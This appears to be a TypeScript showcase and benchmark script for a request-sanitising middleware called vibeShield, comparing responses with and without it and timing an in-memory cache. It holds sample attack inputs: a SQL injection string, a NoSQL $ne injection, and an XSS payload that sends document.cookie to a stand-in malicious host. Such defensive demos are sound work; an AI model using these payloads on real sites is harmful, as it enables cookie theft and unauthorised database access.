import { vibeShield } from '../src/index.js';
import { performance } from 'perf_hooks';

// ==========================================
// 1. MOCK HANDLERS FOR SECURITY SHOWCASE
// ==========================================

async function mockNoviceHandler(req: Request): Promise<Response> {
  try {
    const body = await req.json();
    return new Response(JSON.stringify({ status: 'success', data: body }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (e: any) {
    return new Response(JSON.stringify({ error: e.message }), { status: 500 });
  }
}

// Wrap the novice handler in vibeShield
const protectedHandler = vibeShield(mockNoviceHandler);

async function runSecurityShowcase() {
  console.log('\n=============================================================');
  console.log('🕵️ VIBESHIELD SECURITY SANITIZATION SHOWCASE');
  console.log('=============================================================\n');

  // Payload A: SQL Injection
  const sqliBody = { username: "admin' OR '1'='1" };
  const sqliReq = () => new Request('http://localhost/login', {
    method: 'POST',
    body: JSON.stringify(sqliBody),
    headers: { 'Content-Type': 'application/json' }
  });

  console.log('--- CASE A: SQL INJECTION ---');
  console.log('Raw Payload sent:', JSON.stringify(sqliBody));
  
  const rawSqliRes = await mockNoviceHandler(sqliReq());
  console.log('Before VibeShield:', await rawSqliRes.text());
  
  const protectedSqliRes = await protectedHandler(sqliReq());
  console.log('After VibeShield: ', await protectedSqliRes.text());
  console.log();

  // Payload B: NoSQL Injection
  const nosqliBody = { password: { $ne: 'admin' } };
  const nosqliReq = () => new Request('http://localhost/login', {
    method: 'POST',
    body: JSON.stringify(nosqliBody),
    headers: { 'Content-Type': 'application/json' }
  });

  console.log('--- CASE B: NOSQL INJECTION ---');
  console.log('Raw Payload sent:', JSON.stringify(nosqliBody));
  
  const rawNosqliRes = await mockNoviceHandler(nosqliReq());
  console.log('Before VibeShield:', await rawNosqliRes.text());
  
  const protectedNosqliRes = await protectedHandler(nosqliReq());
  console.log('After VibeShield: ', await protectedNosqliRes.text());
  console.log();

  // Payload C: Cross-Site Scripting (XSS)
  const xssBody = { comment: "<script>fetch('malicious-site.com?cookie=' + document.cookie)</script>Nice post!" };
  const xssReq = () => new Request('http://localhost/comment', {
    method: 'POST',
    body: JSON.stringify(xssBody),
    headers: { 'Content-Type': 'application/json' }
  });

  console.log('--- CASE C: XSS ATTACK ---');
  console.log('Raw Payload sent:', JSON.stringify(xssBody));
  
  const rawXssRes = await mockNoviceHandler(xssReq());
  console.log('Before VibeShield:', await rawXssRes.text());
  
  const protectedXssRes = await protectedHandler(xssReq());
  console.log('After VibeShield: ', await protectedXssRes.text());
  console.log();
}

// ==========================================
// 2. MOCK HANDLERS FOR PERFORMANCE BENCHMARK
// ==========================================

let dbQueryCount = 0;

// Simulates a heavy database query taking 2ms
async function heavyDatabaseHandler(req: Request): Promise<Response> {
  dbQueryCount++;
  await new Promise(resolve => setTimeout(resolve, 2));
  return new Response(JSON.stringify({ status: 'ok', data: 'heavy-query-results', queryNumber: dbQueryCount }), {
    headers: { 'Content-Type': 'application/json' }
  });
}

// Wrap for cache testing
const cachedHandler = vibeShield(heavyDatabaseHandler, {
  cache: { enabled: true, ttl: 10 }
});

async function runPerformanceBenchmark() {
  console.log('=============================================================');
  console.log('🚀 VIBESHIELD PERFORMANCE BENCHMARK (1,000 REQUESTS)');
  console.log('=============================================================\n');

  const req = () => new Request('http://localhost/api/heavy-data', { method: 'GET' });
  const iterations = 1000;

  // --- Benchmark 1: Without Cache ---
  console.log(`Running ${iterations} requests WITHOUT cache...`);
  dbQueryCount = 0;
  const startNoCache = performance.now();
  for (let i = 0; i < iterations; i++) {
    const res = await heavyDatabaseHandler(req());
    await res.text(); // consume body
  }
  const endNoCache = performance.now();
  const durationNoCache = endNoCache - startNoCache;
  const queriesNoCache = dbQueryCount;

  console.log(`Finished. Duration: ${durationNoCache.toFixed(2)} ms`);
  console.log(`Total Database Queries Executed: ${queriesNoCache}\n`);

  // --- Benchmark 2: With VibeShield In-Memory Cache ---
  console.log(`Running ${iterations} requests WITH VibeShield Cache...`);
  dbQueryCount = 0;
  
  const startCache = performance.now();
  
  // First request to populate the cache
  const firstRes = await cachedHandler(req());
  await firstRes.text();
  
  // Yield execution to allow non-blocking background cache write to complete
  await new Promise(r => setTimeout(r, 10));

  // Blast remaining 999 requests
  for (let i = 1; i < iterations; i++) {
    const res = await cachedHandler(req());
    await res.text();
  }
  const endCache = performance.now();
  const durationCache = endCache - startCache;
  const queriesCache = dbQueryCount;

  console.log(`Finished. Duration: ${durationCache.toFixed(2)} ms`);
  console.log(`Total Database Queries Executed: ${queriesCache}\n`);

  // --- Calculations ---
  const latencyReduction = ((durationNoCache - durationCache) / durationNoCache) * 100;
  const averageLatencyNoCache = durationNoCache / iterations;
  const averageLatencyCache = durationCache / iterations;

  console.log('=============================================================');
  console.log('📊 BENCHMARK SUMMARY RESULTS');
  console.log('=============================================================');
  console.log(`Without Cache Duration: ${durationNoCache.toFixed(2)} ms (Avg: ${averageLatencyNoCache.toFixed(4)} ms/req)`);
  console.log(`With VibeShield Cache:  ${durationCache.toFixed(2)} ms (Avg: ${averageLatencyCache.toFixed(4)} ms/req)`);
  console.log(`Performance Speedup:    ${(durationNoCache / durationCache).toFixed(1)}x faster`);
  console.log(`Database Latency Cut:   ${latencyReduction.toFixed(2)}% reduction`);
  console.log(`Database Load Relieved: ${(((queriesNoCache - queriesCache) / queriesNoCache) * 100).toFixed(2)}% fewer queries`);
  console.log('=============================================================\n');
}

// Run the suite
async function main() {
  await runSecurityShowcase();
  await runPerformanceBenchmark();
}

main().catch(console.error);
